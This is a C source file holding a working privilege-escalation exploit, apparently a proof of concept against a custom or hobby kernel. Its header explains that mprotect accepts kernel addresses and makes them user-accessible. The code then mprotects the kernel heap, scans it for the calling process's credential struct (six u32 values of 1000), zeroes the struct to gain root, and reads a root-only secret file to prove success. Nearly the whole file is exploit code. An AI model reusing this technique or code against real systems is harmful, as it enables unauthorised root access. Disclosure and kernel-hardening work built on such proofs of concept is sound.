// mprotect() accepts kernel addresses: leaf_flags() sets USER_ACCESSIBLE and the
// kernel higher-half page tables are shared across processes, so mprotect on the
// kernel heap turns it into a ring3-accessible W+X alias. Scan it for the calling
// process's Creds (six u32 = 1000 after setgid/setuid drop), zero them, become root.
// Build: gcc -O2 -no-pie -o kheap kheap.c
#define _GNU_SOURCE
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define HEAP_BASE 0xffffffff801bf000UL   /* layout::heap_base() for the staged kernel */
#define SCAN_BYTES (64UL * 1024 * 1024)

static long xwrite(int fd, const void *b, unsigned long n) {
    return syscall(SYS_write, fd, b, n);
}
static void out(const char *s) { xwrite(1, s, strlen(s)); }
static void hex(char *dst, uint64_t v) {
    static const char *h = "0123456789abcdef";
    dst[0]='0'; dst[1]='x';
    for (int i=0;i<16;i++) dst[2+i]=h[(v>>(60-4*i))&0xf];
    dst[18]=0;
}
static void line(const char *a, uint64_t v) {
    char buf[128], hx[24]; hex(hx, v);
    strcpy(buf, a); strcat(buf, hx); strcat(buf, "\n"); out(buf);
}

int main(void) {
    char buf[160], hx[24] = {0};
    /* root-only file to prove the escalation */
    int fd = open("/mnt/secret", O_CREAT|O_WRONLY|O_TRUNC, 0600);
    if (fd >= 0) { xwrite(fd, "ROOT-ONLY-SECRET-7f3a\n", 22); close(fd); }
    line("PWN-KHEAP: created /mnt/secret, uid=", (uint64_t)getuid());

    /* drop to an unprivileged identity: creds become six u32 == 1000 */
    setgid(1000);
    setuid(1000);
    line("PWN-KHEAP: dropped, uid=", (uint64_t)getuid());
    if (open("/mnt/secret", O_RDONLY) >= 0) out("PWN-KHEAP: UNEXPECTED: read before exploit\n");
    else out("PWN-KHEAP: root file denied before exploit (expected)\n");

    const uint32_t pat32[6] = {1000,1000,1000,1000,1000,1000};
    uint8_t pat[24]; memcpy(pat, pat32, 24);

    uint64_t found = 0;
    unsigned long pages = 0;
    for (uint64_t va = HEAP_BASE; va < HEAP_BASE + SCAN_BYTES; va += 4096) {
        if (mprotect((void*)va, 4096, PROT_READ|PROT_WRITE|PROT_EXEC) != 0) continue;
        pages++;
        uint8_t *p = (uint8_t*)va;
        for (unsigned off = 0; off + 24 <= 4096; off += 4) {
            if (memcmp(p + off, pat, 24) == 0) { found = va + off; break; }
        }
        if (found) break;
    }
    line("PWN-KHEAP: mprotected pages=", pages);
    if (!found) { out("PWN-KHEAP: creds pattern not found\n"); return 1; }
    line("PWN-KHEAP: creds pattern at ", found);
    memset((void*)found, 0, 24);   /* uid=gid=euid=egid=suid=sgid=0 */

    line("PWN-KHEAP: after zero, uid=", (uint64_t)getuid());
    line("PWN-KHEAP: after zero, euid=", (uint64_t)geteuid());
    int f = open("/mnt/secret", O_RDONLY);
    if (f < 0) { out("PWN-KHEAP: root file still denied\n"); return 1; }
    long n = read(f, buf, sizeof(buf)-1);
    if (n < 0) n = 0;
    buf[n] = 0;
    out("PWN-KHEAP: SUCCESS root file contents: ");
    out(buf);
    out(found ? "PWN-KHEAP: done\n" : "");
    return 0;
}
